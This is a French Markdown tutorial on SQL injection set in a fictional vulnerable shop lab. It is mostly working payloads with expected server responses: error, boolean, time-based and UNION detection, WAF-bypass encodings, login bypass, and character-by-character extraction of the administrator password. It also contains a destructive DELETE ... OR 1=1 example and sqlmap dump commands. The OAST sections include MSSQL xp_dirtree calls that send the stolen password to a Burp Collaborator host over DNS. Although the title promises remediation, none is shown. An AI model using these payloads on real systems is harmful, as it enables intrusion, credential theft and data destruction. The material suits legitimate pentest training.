---
title: "Injections SQL (SQLi) : Détection, Exploitation et Prévention"
description: "Guide complet sur les injections SQL : détection In-Band/Inline/Blind/OAST, attaques UNION, exfiltration, WAF bypass, fingerprinting et remédiation par requêtes préparées et listes blanches."
tags:
  - sqli
  - web-security
  - red-team
  - blue-team
  - database
  - vulnerability
  - remediation
---

# Injections SQL (SQLi) : Détection, Exploitation et Prévention

!!! note "Scénario de lab utilisé dans toute la fiche"
    Pour rendre chaque technique reproductible, on s'appuie sur une application e-commerce fictive vulnérable, typique des labs PortSwigger/DVWA :

    - Une page produit accessible via `GET /produit?id=1`, qui exécute côté serveur :
      ```sql
      SELECT nom, prix, description FROM produits WHERE id = '1';
      ```
    - Une page de connexion `POST /login` avec les champs `username` et `password`, qui exécute :
      ```sql
      SELECT * FROM users WHERE username = 'USERNAME' AND password = 'PASSWORD';
      ```
    - Une table `users(id, username, password, is_admin)` que l'on cherchera à dumper.

    Chaque section reprend ce contexte pour montrer non seulement le payload, mais **pourquoi** on l'envoie, **ce qu'on observe en retour**, et **comment en déduire l'étape suivante**.

---

## 1. Détection des Vulnérabilités SQLi

### 1.1 In-Band (Basé sur les erreurs et anomalies)

**Démarche :** on envoie une valeur qui casse volontairement la syntaxe SQL, dans le but de faire remonter une erreur brute du SGBD — preuve que notre entrée est concaténée directement dans la requête sans échappement ni paramétrage.

**Requête envoyée :**

```http
GET /produit?id=1' HTTP/1.1
Host: cible.exemple
```

**Ce que ça donne côté serveur :**

```sql
-- Requête légitime attendue
SELECT nom, prix, description FROM produits WHERE id = '1';

-- Requête réellement exécutée après injection de l'apostrophe
SELECT nom, prix, description FROM produits WHERE id = '1'';
--                                                        ^ apostrophe orpheline, syntaxe cassée
```

**Réponse attendue si la page est vulnérable :**

```text
HTTP/1.1 500 Internal Server Error

Unclosed quotation mark after the character string ''.
```

!!! danger "Signaux de détection"
    - Messages d'erreur verbeux renvoyés par le SGBD, par exemple :
        - `Unclosed quotation mark after the character string...` (SQL Server)
        - `You have an error in your SQL syntax...` (MySQL/MariaDB)
    - Code de statut HTTP anormal : `HTTP 500 Internal Server Error` au lieu du `HTTP 200 OK` attendu.
    - Anomalies comportementales côté rendu : page blanche, éléments manquants, sections tronquées.

**Interprétation :** si l'apostrophe seule casse la page (erreur 500 ou page blanche), c'est la première preuve que le paramètre `id` est injecté tel quel dans la requête SQL. L'étape suivante consiste à **confirmer** que c'est bien nous qui contrôlons la syntaxe, pas juste un bug d'affichage — d'où le test de l'échappement dans la sous-section suivante.

**Confirmation par double apostrophe (échappement SQL) :**

```http
GET /produit?id=1'' HTTP/1.1
```

Si la page redevient normale avec `1''` (deux apostrophes, qui forment une chaîne vide valide en SQL : `WHERE id = '1'''` devient syntaxiquement correct), cela confirme que le comportement observé est bien lié à la syntaxe SQL, et non à un autre bug applicatif.

### 1.2 Inline (Évaluation d'expressions / calculs serveur)

**Contexte :** sur un paramètre numérique, une simple apostrophe peut être filtrée ou ne rien casser si le développeur caste la valeur en entier avant de l'utiliser. On teste alors si le serveur **évalue** une expression arithmétique plutôt que de la traiter comme du texte brut.

**Démarche pas à pas :**

1. On note le rendu de référence avec la valeur d'origine :
   ```http
   GET /produit?id=1 HTTP/1.1
   ```
   → affiche le produit n°1 (ex : "T-shirt bleu").

2. On remplace `id=1` par une expression qui, **si elle est évaluée par SQL**, redonne `1` :
   ```http
   GET /produit?id=2-1 HTTP/1.1
   ```
   → si la page affiche **toujours** le produit n°1, c'est que le serveur a exécuté `2-1` côté SQL et non traité la chaîne `"2-1"` littéralement (ce qui aurait provoqué une erreur de conversion ou un résultat vide).

3. On confirme avec une expression qui change le résultat :
   ```http
   GET /produit?id=1+1 HTTP/1.1
   ```
   → si la page affiche maintenant le produit n°2, la preuve est définitive : le paramètre est interprété comme une expression SQL, pas comme un simple entier.

!!! tip "Pourquoi ce test est important"
    Beaucoup de développeurs pensent qu'un paramètre "numérique" est protégé nativement. Ce test prouve le contraire dès lors que la requête est construite par concaténation de chaînes (`"WHERE id = " + input`) même sans guillemets autour de la valeur.

### 1.3 Boolean-Based Blind SQLi (Conditions booléennes)

**Contexte :** ici, l'application ne renvoie ni erreur SQL ni code 500 quoi qu'on injecte — elle renvoie toujours un `HTTP 200`. La seule différence observable est **le contenu de la page**. On va donc comparer le rendu entre une condition vraie et une condition fausse.

**Étape 1 — Test d'une condition VRAIE, sur un champ texte (ex : recherche produit) :**

```http
GET /produit?id=1' OR '1'='1 HTTP/1.1
```

Requête résultante côté SGBD :

```sql
SELECT nom, prix, description FROM produits WHERE id = '1' OR '1'='1';
-- La condition OR '1'='1' est toujours vraie : TOUTES les lignes de la table sont retournées
```

**Résultat attendu :** la page affiche anormalement **tous les produits** de la boutique au lieu d'un seul — signe que la clause `WHERE` a été neutralisée par notre tautologie.

**Étape 2 — Test d'une condition FAUSSE, pour confirmer (élimination des faux positifs) :**

```http
GET /produit?id=1' AND '1'='2 HTTP/1.1
```

```sql
SELECT nom, prix, description FROM produits WHERE id = '1' AND '1'='2';
-- La condition AND '1'='2' est toujours fausse : AUCUNE ligne n'est retournée
```

**Résultat attendu :** la page affiche **zéro produit**, même si `id=1` existe réellement en base.

!!! warning "Pourquoi tester systématiquement les deux cas"
    Un seul test (VRAI) ne suffit pas : la page pourrait afficher "tous les produits" pour une tout autre raison (erreur applicative, fallback par défaut). C'est la **divergence cohérente** entre le test VRAI (résultat élargi/positif) et le test FAUX (résultat vide/négatif) qui constitue la preuve fiable d'une injection Boolean-Based.

**Application à l'authentification (bypass de login) :** le même principe permet de se connecter sans connaître de mot de passe valide — voir la section [3.2](#32-subversion-de-la-logique-applicative-bypass-dauthentification).

### 1.4 Time-Based SQLi (Délais de réponse)

**Contexte :** cas le plus difficile — ni erreur, ni différence de contenu, ni différence de taille de réponse, quelle que soit la condition injectée (typiquement une API qui renvoie toujours le même JSON générique `{"status":"ok"}`). Le seul canal restant est le **temps de réponse**.

**Démarche :**

1. On mesure le temps de réponse de référence (sans injection) : par exemple **~80 ms**.
2. On injecte une pause conditionnée à une expression **toujours vraie**, et on mesure à nouveau :

```sql
-- MySQL / MariaDB
' AND SLEEP(5) --

-- PostgreSQL
' AND pg_sleep(5) --

-- SQL Server (MSSQL)
' WAITFOR DELAY '0:0:5' --
```

Requête HTTP correspondante (paramètre `id`) :

```http
GET /produit?id=1' AND SLEEP(5)-- HTTP/1.1
```

**Résultat attendu :** le temps de réponse passe de ~80 ms à **~5 080 ms** (5 secondes de pause + le temps normal de traitement). Le contenu de la réponse, lui, reste strictement identique à une requête normale — c'est bien le **délai**, et uniquement lui, qui trahit l'exécution de notre code SQL.

3. On répète le test 2 à 3 fois pour écarter une latence réseau ponctuelle non liée à l'injection, et on teste aussi une valeur de délai différente (ex : `SLEEP(10)`) pour vérifier que le délai mesuré varie **proportionnellement** à la valeur injectée — ce qui écarte définitivement une coïncidence.

!!! tip "Pourquoi ce test est la référence en dernier recours"
    Le canal temporel fonctionne même quand l'application ne renvoie **strictement aucune information exploitable** dans sa réponse (API totalement muette, comportement identique quoi qu'il arrive). C'est pour cette raison qu'il est utilisé comme extension du Blind SQLi lorsque le canal booléen (1.3) lui-même n'est pas exploitable.

### 1.5 Out-of-Band / OAST (Out-of-band Application Security Testing)

**Contexte :** certains traitements sont totalement asynchrones — par exemple un endpoint qui enregistre une commande et répond immédiatement `202 Accepted` pendant qu'un worker traite la requête SQL en arrière-plan, des minutes plus tard. Dans ce cas, ni le contenu ni le délai de la réponse HTTP immédiate ne renseignent sur l'exécution SQL réelle. On doit alors forcer le SGBD à effectuer **lui-même** une requête réseau sortante vers un serveur que l'on contrôle.

**Préparation du lab :** on génère un sous-domaine unique via un service de type Burp Collaborator (ou un serveur DNS/HTTP maison), par exemple `a1b2c3.oastify.com`, qui journalise toute requête DNS/HTTP entrante.

**Payload MSSQL — déclenchement d'une résolution DNS via `xp_dirtree` :**

```sql
'; exec master..xp_dirtree '\\a1b2c3.oastify.com\partage'--
```

**Pourquoi ça fonctionne :** `xp_dirtree` est une procédure système censée lister le contenu d'un répertoire réseau. Pour cela, SQL Server tente de **résoudre le nom d'hôte** `a1b2c3.oastify.com` avant même d'essayer d'y accéder — cette résolution DNS part du serveur SQL lui-même, pas du navigateur de l'attaquant.

**Ce qu'on observe côté serveur d'écoute (interface Burp Collaborator) :**

```text
Type: DNS
Interaction reçue depuis : 203.0.113.45 (IP du serveur SQL cible)
Requête : a1b2c3.oastify.com
```

**Interprétation :** la simple réception de cette requête DNS, provenant bien de l'IP du SGBD et non du poste de l'auditeur, constitue la **preuve irréfutable** que notre payload SQL a été exécuté côté serveur — même si l'application n'a jamais rien renvoyé d'anormal dans sa réponse HTTP.

**Équivalent Oracle (fonction réseau native) :**

```sql
SELECT UTL_INADDR.get_host_address('a1b2c3.oastify.com') FROM dual;
```

!!! danger "Cas d'usage typique"
    L'OAST est la seule technique fiable face à des traitements par lots (batch), des API totalement aveugles, ou des applications qui normalisent systématiquement leurs réponses (mêmes headers, même temps de traitement, même contenu) pour éviter justement les techniques 1.3 et 1.4.

---

## 2. Emplacements, Contextes d'Injection et Contournement

### 2.1 Emplacements dans les requêtes SQL

Toutes les techniques précédentes supposent implicitement une clause `WHERE` dans un `SELECT`, mais l'injection peut survenir n'importe où où une donnée utilisateur est concaténée :

| Type de requête | Emplacement typique | Exemple de contexte applicatif |
|---|---|---|
| `SELECT` | Clause `WHERE` | Page produit, recherche, filtre |
| `UPDATE` | Clause `SET` / `WHERE` | Mise à jour de profil utilisateur |
| `INSERT` | Valeurs insérées | Formulaire d'inscription, avis client |
| `SELECT` (structure) | Noms de tables/colonnes, `ORDER BY` | Tri dynamique dans un tableau de résultats |

**Exemple concret sur `ORDER BY` (souvent oublié car "non risqué") :**

```http
GET /produits?sort=prix HTTP/1.1
```

```sql
SELECT * FROM produits ORDER BY prix;
```

Si `sort` est injecté sans validation :

```http
GET /produits?sort=(CASE WHEN (1=1) THEN prix ELSE nom END) HTTP/1.1
```

Même sans pouvoir extraire de données directement ici, ce point est exploitable en **Boolean-Based** : l'ordre d'affichage des produits diffère selon que la condition est vraie ou fausse, ce qui constitue un canal d'exfiltration à part entière.

### 2.2 Contournement de WAF (WAF Bypass) via encodage

**Contexte :** un WAF placé devant l'application bloque toute requête contenant le mot `SELECT` en clair. On sait que l'application, elle, décode certains formats (XML, JSON Unicode) **après** avoir traversé le WAF, avant d'exécuter la requête SQL. L'objectif est donc de faire passer notre payload sous une forme que le WAF ne reconnaît pas, mais que l'application décodera correctement.

!!! warning "Techniques d'évasion"
    Les WAF filtrant sur des motifs textuels bruts (`SELECT`, `UNION`, etc.) peuvent être contournés si la couche applicative décode les données **après** le filtrage.

**Encodage XML / entités hexadécimales :**

```xml
<!-- Le WAF voit "&#x53;ELECT", pas "SELECT" : il laisse passer.
     L'application décode l'entité XML AVANT d'exécuter le SQL : le SGBD voit bien SELECT. -->
<storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
```

**Encodage Unicode JSON :**

```json
{
  "storeId": "999 \u0053ELECT * FROM information_schema.tables"
}
```

**Comment valider que le bypass fonctionne :** on envoie d'abord le payload en clair (`SELECT`) pour confirmer que le WAF le bloque (réponse `403 Forbidden` typiquement), puis on envoie la version encodée et on observe si la réponse redevient celle d'une exécution SQL normale (erreur SQL, délai, ou contenu différent selon la technique de détection choisie en section 1).

### 2.3 En-têtes HTTP enregistrés en base de données

**Contexte :** les audits se concentrent souvent sur les paramètres GET/POST visibles et oublient les en-têtes HTTP, pourtant fréquemment journalisés en base (logs d'accès, tracking analytics) sans paramétrage.

```http
POST /login HTTP/1.1
Host: cible.exemple
User-Agent: ' OR 1=1-- 
Content-Type: application/x-www-form-urlencoded

username=test&password=test
```

**Pourquoi ça peut fonctionner même si le formulaire de login est correctement paramétré :** si l'application exécute séparément une requête de journalisation du type `INSERT INTO logs (user_agent) VALUES ('` + en-tête brut + `')`, cette requête-là peut être vulnérable indépendamment du formulaire principal — d'où l'intérêt de tester **systématiquement** chaque en-tête réfléchi ou journalisé (`User-Agent`, `Referer`, `X-Forwarded-For`) avec les mêmes techniques que pour un paramètre classique.

---

## 3. Techniques d'Attaque et Cas d'Usage

### 3.1 Exfiltration de données cachées

**Contexte :** une boutique en ligne ne montre que les produits `WHERE category = 'Gifts' AND is_visible = 1`. Certains produits existent en base mais sont volontairement masqués (`is_visible = 0`) — promotions non publiées, produits en rupture. On veut les faire apparaître.

**Étape 1 — Neutraliser la fin de la requête avec un commentaire :**

```http
GET /produits?categorie=Gifts'-- HTTP/1.1
```

```sql
-- Requête d'origine
SELECT * FROM produits WHERE category = 'Gifts' AND is_visible = 1;

-- Après injection : tout ce qui suit '-- est ignoré par le SGBD
SELECT * FROM produits WHERE category = 'Gifts'-- ' AND is_visible = 1;
```

**Résultat attendu :** la condition `is_visible = 1` n'est plus jamais évaluée. Tous les produits de la catégorie `Gifts`, y compris les masqués, s'affichent.

**Étape 2 — Étendre à toutes les catégories avec une tautologie :**

```http
GET /produits?categorie=Gifts' OR 1=1-- HTTP/1.1
```

```sql
SELECT * FROM produits WHERE category = 'Gifts' OR 1=1-- ' AND is_visible = 1;
-- OR 1=1 rend la condition toujours vraie, quelle que soit la catégorie
```

**Résultat attendu :** absolument tous les produits de la table s'affichent, toutes catégories et statuts confondus — preuve que l'on contrôle entièrement la clause `WHERE`.

!!! danger "Avertissement de sécurité"
    Le même paramètre, réutilisé ailleurs dans l'application sur une action destructrice, devient catastrophique :
    ```sql
    DELETE FROM products WHERE category = 'Gifts' OR 1=1--
    ```
    Cette requête supprime l'intégralité de la table `products`. En audit réel, on ne teste **jamais** cette variante sur un environnement de production — uniquement en lab ou avec autorisation explicite et environnement isolé.

### 3.2 Subversion de la logique applicative (Bypass d'authentification)

**Contexte :** on cible le formulaire de login décrit dans le scénario de lab, sans connaître aucun mot de passe valide.

**Requête légitime exécutée par le serveur :**

```sql
SELECT * FROM users WHERE username = 'USERNAME' AND password = 'PASSWORD';
```

**Étape 1 — On injecte uniquement le champ `username`, en laissant `password` à une valeur quelconque :**

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=administrator'--&password=nimportequoi
```

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'nimportequoi';
--                                   ^ tout le reste de la clause WHERE est commenté
```

**Résultat attendu :** la requête devient équivalente à `SELECT * FROM users WHERE username = 'administrator';` — le mot de passe n'est **plus jamais vérifié**. Si le compte `administrator` existe, l'application nous connecte en tant que lui sans qu'aucun mot de passe correct n'ait été fourni.

!!! note "Variantes selon le SGBD"
    - **MySQL** : un espace est requis après le commentaire double-tiret : `administrator'-- ` (espace final obligatoire, sinon la syntaxe `--` n'est pas reconnue comme un commentaire par le parseur MySQL).
    - Alternative avec `#` (spécifique MySQL, pas besoin d'espace) : `administrator'#`.

**Étape 2 — Se connecter en tant qu'admin sans même connaître son identifiant :**

```http
username=' OR 1=1 LIMIT 1--&password=x
```

```sql
SELECT * FROM users WHERE username = '' OR 1=1 LIMIT 1--' AND password = 'x';
-- OR 1=1 : toutes les lignes correspondent. LIMIT 1 : on ne récupère que la première (souvent l'admin, ID le plus bas)
```

**Pourquoi `LIMIT 1` ici et pas ailleurs :** sans lui, la requête retournerait toutes les lignes de `users`, et le comportement de l'application dépendra alors de comment elle traite un jeu de résultats multiple pour une authentification (souvent : elle prend la première ligne de toute façon, mais ce n'est pas garanti — `LIMIT 1` le force explicitement).

```sql
-- MSSQL / Oracle : pas de LIMIT, on utilise TOP ou ROWNUM si nécessaire
' OR 1=1--
```

### 3.3 Attaques basées sur UNION (UNION-Based SQLi)

**Contexte :** on veut faire apparaître, dans les colonnes normalement réservées à `nom`, `prix`, `description` de la page produit, des données provenant d'une **autre table** (`users`). C'est la technique la plus directe pour exfiltrer massivement des données quand la page reflète le contenu d'une requête `SELECT` dans son rendu HTML.

!!! note "Prérequis"
    - Le nombre de colonnes de la requête `UNION SELECT` doit être **identique** à celui de la requête d'origine.
    - Les types de données de chaque colonne doivent être compatibles entre les deux requêtes (une colonne numérique ne peut pas recevoir de texte sans conversion).

**Étape 1 — Découvrir le nombre de colonnes de la requête d'origine, via `ORDER BY` :**

On incrémente l'index jusqu'à obtenir une erreur :

```http
GET /produit?id=1' ORDER BY 1-- HTTP/1.1   → 200 OK
GET /produit?id=1' ORDER BY 2-- HTTP/1.1   → 200 OK
GET /produit?id=1' ORDER BY 3-- HTTP/1.1   → 200 OK
GET /produit?id=1' ORDER BY 4-- HTTP/1.1   → 500 Internal Server Error
```

**Interprétation :** l'erreur apparaît à `ORDER BY 4` car SQL essaie de trier sur une 4ᵉ colonne qui n'existe pas. La requête d'origine comporte donc exactement **3 colonnes**.

**Étape 2 — Identifier quelles colonnes acceptent du texte, en substituant des `NULL` :**

```http
GET /produit?id=1' UNION SELECT NULL,NULL,NULL-- HTTP/1.1
```

Si cela renvoie `200 OK` sans erreur, on remplace progressivement chaque `NULL` par `'a'` pour voir laquelle accepte du texte sans provoquer d'erreur de conversion de type :

```sql
' UNION SELECT 'a',NULL,NULL--   -- teste si la colonne 1 accepte du texte
' UNION SELECT NULL,'a',NULL--   -- teste si la colonne 2 accepte du texte
' UNION SELECT NULL,NULL,'a'--   -- teste si la colonne 3 accepte du texte
```

**Résultat attendu :** une (ou plusieurs) de ces variantes renvoie `200 OK` avec la lettre `a` visible quelque part sur la page (par exemple à l'emplacement du champ `nom` du produit) — cela nous indique **dans quelle colonne** injecter nos données à exfiltrer, et **où** elles s'afficheront visuellement.

!!! tip "Spécificité Oracle"
    Oracle impose la clause `FROM DUAL` pour toute requête `SELECT` sans table source :
    ```sql
    ' UNION SELECT NULL,NULL,NULL FROM DUAL--
    ```

**Étape 3 — Exfiltration réelle, en supposant que la colonne 2 (celle du `nom` affiché) accepte le texte :**

```http
GET /produit?id=1' UNION SELECT NULL, username, password FROM users-- HTTP/1.1
```

**Résultat attendu :** la page produit, censée afficher un seul article, affiche désormais **une ligne par utilisateur de la table `users`**, avec le nom d'utilisateur à l'emplacement du "nom produit" et le mot de passe (ou son hash) à l'emplacement de la "description". On vient de dumper l'intégralité de la table des comptes via une simple page produit.

**Variante mono-colonne (si une seule colonne texte est disponible) — concaténation :**

```sql
' UNION SELECT NULL, username || ':' || password, NULL FROM users--   -- Oracle/PostgreSQL
' UNION SELECT NULL, CONCAT(username,':',password), NULL FROM users-- -- MySQL
```

---

## 4. Techniques d'Exploitation Aveugles (Blind SQLi & Advanced)

### 4.1 Réponses conditionnelles (Boolean-Based) — extraction réelle

**Contexte :** l'application n'affiche aucune erreur ni aucun résultat exploitable en UNION (la page ne reflète pas de données de la base dans son HTML), mais elle affiche un message `"Bienvenue"` uniquement si un cookie de session `TrackingId` correspond à un utilisateur valide. C'est ce signal binaire qu'on va exploiter pour extraire le mot de passe **caractère par caractère**, sans jamais le voir apparaître directement.

**Étape 1 — Confirmer le vecteur sur le cookie :**

```http
GET /home HTTP/1.1
Cookie: TrackingId=xyz' AND '1'='1
```

→ page affiche `"Bienvenue"` (condition vraie).

```http
Cookie: TrackingId=xyz' AND '1'='2
```

→ page n'affiche plus `"Bienvenue"` (condition fausse). Le vecteur est confirmé.

**Étape 2 — Déterminer la longueur du mot de passe de `administrator` :**

```http
Cookie: TrackingId=xyz' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20--
```

On incrémente la valeur testée (`=20`, `=21`, `=19`...) jusqu'à obtenir `"Bienvenue"` — cela nous donne la longueur exacte à extraire, disons **20 caractères**.

**Étape 3 — Extraire chaque caractère un par un via `SUBSTRING()` :**

```sql
-- Position 1 : est-ce que le 1er caractère du mot de passe est 'a' ?
xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--
```

```http
Cookie: TrackingId=xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--
```

- Si la page affiche `"Bienvenue"` → le 1ᵉʳ caractère **est** `a`, on passe à la position 2.
- Sinon → on teste `b`, puis `c`, etc., jusqu'à trouver la bonne lettre pour la position 1.

On répète cette logique pour chacune des 20 positions déterminées à l'étape 2, en testant l'ensemble des caractères possibles (`a-z`, `A-Z`, `0-9`) à chaque position, jusqu'à avoir reconstitué le mot de passe complet.

!!! tip "Pourquoi c'est fastidieux à la main et comment on l'accélère"
    Fait manuellement, extraire un mot de passe de 20 caractères sur un alphabet de 62 caractères nécessite jusqu'à `20 × 62 = 1240` requêtes dans le pire cas. En pratique, on optimise de deux façons :

    - **Recherche dichotomique sur le code ASCII** plutôt que test d'égalité caractère par caractère : au lieu de `SUBSTRING(...)='a'`, on teste `ASCII(SUBSTRING(...)) > 109`, ce qui ramène chaque position à ~7 requêtes (`log2(94)`) au lieu de 62 en moyenne.
    - **Automatisation** via Burp Intruder (mode Cluster Bomb pour combiner position × caractère testé, ou Sniper pour une position fixée) ou via `sqlmap`, qui implémente nativement cette dichotomie :
    ```bash
    sqlmap -u "https://cible.exemple/home" --cookie="TrackingId=xyz" -p TrackingId --level=2 --dump
    ```

### 4.2 Erreurs SQL conditionnelles — extraction réelle

**Contexte :** même situation que 4.1 (aucune donnée reflétée, aucun canal booléen visible), mais ici l'application renvoie une erreur `HTTP 500` générique dès qu'une exception SQL survient côté serveur, **sans en afficher le détail**. On va transformer chaque comparaison de caractère en une condition qui, si elle est vraie, déclenche une division par zéro — donc un crash SQL détectable via le code de statut HTTP, même si le message d'erreur lui-même est masqué.

**Étape 1 — Valider que le vecteur fonctionne, avec une condition volontairement vraie puis fausse :**

```http
GET /produit?id=xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a HTTP/1.1
```

→ attendu : `HTTP 500` (la condition `1=1` est vraie, `1/0` explose).

```http
GET /produit?id=xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a HTTP/1.1
```

→ attendu : `HTTP 200` (la condition `1=2` est fausse, on retombe dans la branche `ELSE 'a'` qui ne crashe pas).

**Étape 2 — Remplacer la condition statique par un test réel sur le mot de passe, caractère par caractère :**

```sql
-- Position 1 : le 1er caractère du mot de passe de 'admin' est-il 'a' ?
xyz' AND (SELECT CASE
            WHEN (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1) = 'a')
            THEN 1/0 ELSE 'a' END)='a
```

- Réponse `HTTP 500` → le 1ᵉʳ caractère **est** `a` → on passe à la position 2.
- Réponse `HTTP 200` → on teste la lettre suivante à la même position (`b`, puis `c`...).

```sql
-- Position 2 : le 2e caractère est-il 'b' ?
xyz' AND (SELECT CASE
            WHEN (SUBSTRING((SELECT password FROM users WHERE username='admin'),2,1) = 'b')
            THEN 1/0 ELSE 'a' END)='a
```

On répète cette logique pour chaque position jusqu'à reconstituer le mot de passe complet, exactement comme en 4.1, mais avec un **code de statut HTTP** comme signal au lieu du contenu de la page — utile précisément quand le canal booléen classique (4.1) n'est pas exploitable parce que la page ne varie jamais visuellement.

!!! danger "Quand utiliser cette technique plutôt que 4.1"
    Cette technique s'utilise spécifiquement quand l'application **masque totalement son contenu HTML en cas d'erreur** (redirection vers une page d'erreur générique identique à chaque fois) mais laisse fuiter le **code de statut HTTP** — un cas fréquent avec les frameworks qui gèrent les exceptions non catchées par un handler global renvoyant systématiquement `500`.

### 4.3 Error-Based SQLi

**Contexte :** ici, contrairement à 4.2, l'application affiche le **message d'erreur brut** du SGBD dans sa réponse (configuration de debug laissée active en production, cas très fréquent). On peut alors forcer une erreur de conversion de type dont le message contient directement la donnée recherchée — une seule requête suffit, sans itération caractère par caractère.

```http
GET /produit?id=1' AND CAST((SELECT Password FROM Users WHERE Username='Administrator') AS int)=1-- HTTP/1.1
```

**Pourquoi ça fonctionne :** le SGBD tente de convertir la chaîne de caractères du mot de passe (ex : `"S3cr3tP@ss"`) en type entier (`int`). Cette conversion échoue nécessairement (un mot de passe n'est pas un nombre), et le SGBD génère une erreur qui **inclut la valeur qu'il a tenté de convertir** :

**Réponse attendue (si les messages d'erreur SQL sont affichés au client) :**

```text
HTTP/1.1 500 Internal Server Error

Conversion failed when converting the varchar value 'S3cr3tP@ss' to data type int.
```

**Résultat :** le mot de passe `S3cr3tP@ss` apparaît **en clair dans le message d'erreur**, en une seule requête — beaucoup plus rapide que l'extraction caractère par caractère des sections 4.1/4.2, mais entièrement dépendant du fait que l'application affiche les erreurs SQL brutes au client (une mauvaise pratique de configuration, mais très répandue).

### 4.4 Exploitation par délais temporels (Time-Based) — extraction réelle

**Contexte :** cas le plus contraint — aucune différence de contenu, aucune erreur visible, code de statut toujours `200`. Seul le temps de réponse varie. On applique ici la même logique qu'en 4.1/4.2, mais le signal "vrai/faux" est un délai de plusieurs secondes plutôt qu'un texte ou un code HTTP.

**Étape 1 — Valider le vecteur avec une condition statique :**

```http
GET /produit?id=1' AND IF(1=1,SLEEP(5),0)-- HTTP/1.1
```

→ attendu : réponse en **~5 secondes** (MySQL).

```http
GET /produit?id=1' AND IF(1=2,SLEEP(5),0)-- HTTP/1.1
```

→ attendu : réponse **immédiate** (~80 ms, comme la baseline).

**Étape 2 — Extraire le 1er caractère du mot de passe en conditionnant le délai à une comparaison réelle :**

```sql
-- MySQL / MariaDB
' AND IF(
  (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin') = 'a',
  SLEEP(5), 0
)--
```

```http
GET /produit?id=1' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)-- HTTP/1.1
```

- Réponse en **~5 s** → le 1ᵉʳ caractère du mot de passe **est** `a`.
- Réponse **immédiate** → on teste la lettre suivante (`b`, `c`, ...) sur la même position.

**Syntaxes équivalentes selon le SGBD (même logique, syntaxe conditionnelle propre à chaque moteur) :**

```sql
-- SQL Server
'; IF ((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a') WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT CASE WHEN
  ((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a')
  THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Oracle
'; SELECT CASE WHEN
  ((SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a')
  THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual--
```

On répète cette requête pour chaque position du mot de passe et chaque caractère testé, exactement comme en 4.1, jusqu'à reconstitution complète.

!!! danger "Pourquoi c'est la technique la plus lente et la plus bruyante"
    Chaque requête "positive" immobilise volontairement une connexion SQL pendant plusieurs secondes. Extraire un mot de passe de 20 caractères en recherche linéaire (jusqu'à 62 essais par position) peut représenter **plusieurs dizaines de minutes**, et génère une charge anormale facilement repérable par un monitoring de latence applicative ou de connexions SGBD actives — c'est la technique de dernier recours, utilisée seulement quand 4.1, 4.2 et 4.3 sont toutes inexploitables.

### 4.5 Exploitation Out-Of-Band / OAST — Exfiltration DNS

**Contexte :** cas extrême — même le canal temporel est inexploitable (traitement asynchrone en arrière-plan, comme évoqué en 1.5). On combine alors la technique OAST de détection avec une exfiltration réelle : au lieu de simplement prouver l'exécution du code, on fait **transiter la donnée volée elle-même** dans le nom de domaine interrogé.

```sql
-- SQL Server (MSSQL)
'; declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='Administrator');
exec('master..xp_dirtree "//'+@p+'.a1b2c3.burpcollaborator.net/a"')--
```

**Pourquoi ça fonctionne :** on construit dynamiquement, côté SQL, un sous-domaine dont le préfixe **est** le mot de passe recherché (`@p`), concaténé au domaine du serveur d'écoute contrôlé par l'auditeur. Lorsque `xp_dirtree` tente de résoudre ce nom, la requête DNS émise contient donc littéralement le mot de passe en clair.

**Ce qu'on observe côté serveur d'écoute :**

```text
Type: DNS
Interaction reçue depuis : 203.0.113.45
Requête : S3cr3tP@ss.a1b2c3.burpcollaborator.net
```

**Résultat :** le sous-domaine interrogé (`S3cr3tP@ss`) **est** le mot de passe recherché — extraction en une seule requête, sans itération caractère par caractère, malgré une application totalement aveugle sur tous les autres canaux.

!!! danger "Portée de l'impact"
    Cette technique fonctionne même sur des architectures totalement aveugles (pas de réponse visible, pas de canal temporel exploitable), ce qui en fait l'une des techniques les plus puissantes en contexte d'audit avancé — à condition que le SGBD dispose des droits et fonctions nécessaires pour émettre des requêtes réseau sortantes (souvent restreint en environnement durci).

---

## 5. Empreinte et Énumération (Fingerprinting & Enumeration)

### 5.1 Fingerprinting du SGBD

**Contexte :** avant d'aller plus loin dans l'énumération, il faut savoir **avec quel SGBD** on discute, car la syntaxe des tables système, des fonctions et des commentaires diffère radicalement d'un moteur à l'autre. On envoie une série de tests différenciants et on observe lequel réussit.

| Critère | MySQL / MariaDB | PostgreSQL | SQL Server | Oracle |
|---|---|---|---|---|
| Commentaire | `#` ou `-- ` | `--` | `--` | `--` |
| Concaténation | `CONCAT()` | `\|\|` | `+` | `\|\|` |
| Table de métadonnées | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` | `all_tables` |
| Version | `version()` | `version()` | `@@version` | `v$version` |

**Démarche différenciante, par élimination :**

```http
GET /produit?id=1' AND @@version IS NOT NULL-- HTTP/1.1
```

→ si la page reste normale (`200 OK`, contenu inchangé), `@@version` est une variable valide → **MySQL/MariaDB ou SQL Server** (les deux la supportent).

```http
GET /produit?id=1' UNION SELECT NULL,version(),NULL-- HTTP/1.1
```

→ si le résultat s'affiche avec une chaîne du type `PostgreSQL 15.2 on x86_64...`, c'est **PostgreSQL**. Sur MySQL, `version()` renvoie aussi un résultat mais au format `8.0.34`. Sur Oracle, cette fonction n'existe pas et provoque une erreur.

```http
GET /produit?id=1' UNION SELECT NULL,banner,NULL FROM v$version-- HTTP/1.1
```

→ si cela réussit, on est sur **Oracle** (seul SGBD à exposer `v$version`).

